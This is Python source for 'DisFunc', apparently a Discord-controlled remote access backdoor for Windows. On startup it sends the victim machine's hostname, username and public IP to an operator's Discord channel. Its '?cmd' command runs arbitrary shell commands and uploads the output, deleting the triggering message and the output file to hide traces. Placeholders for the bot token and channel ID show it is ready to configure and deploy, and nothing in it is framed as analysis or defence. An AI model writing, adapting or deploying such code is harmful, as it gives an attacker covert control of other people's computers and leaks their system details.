import os, getpass, discord, requests, random, asyncio, socket
from discord.ext import commands

def GetIP():
    ip = requests.get("https://api.ipify.org").text
    return ip

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

DisFunc = commands.Bot(description='DisFunc', command_prefix='?', bot=True)
DisFunc.remove_command('help')
loop = asyncio.get_event_loop()

@DisFunc.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@DisFunc.event
async def on_ready():
    hostname = socket.gethostname()
    channel = DisFunc.get_channel(111111111111111111111) #CHANGE THIS
    user = getpass.getuser()
    embed = discord.Embed(title=':white_check_mark: DisFunc Connection', description='** **', colour=RandomColor())
    embed.add_field(name=f':computer:  Hostname: `{hostname}`', value='** **', inline=False)
    embed.add_field(name=f':man:  User: `{user}`', value='** **', inline=False)
    embed.add_field(name=':globe_with_meridians:  IP: `' + GetIP() + '`', value='** **', inline=False)
    embed.add_field(name=':keyboard:  Prefix: `?`', value='** **', inline=False)

    await channel.send(embed=embed)

@DisFunc.command()
async def cmd(ctx, *, cmds):
    await ctx.message.delete()
    output = os.popen(f'{cmds}').read()
    os.system(f'{cmds} > C:\\ProgramData\cmd.txt')
    f = open('C:\\ProgramData\cmd.txt', 'w')
    f.write(output)
    f.close()
    await ctx.send(file=discord.File(r'C:\\ProgramData\cmd.txt'))
    os.remove('C:\\ProgramData\cmd.txt')
    #await ctx.send('Removed File!')

loop.create_task(DisFunc.start('TOKEN-HERE')) #CHANGE THIS

try:
    loop.run_forever()
except:
    loop.stop()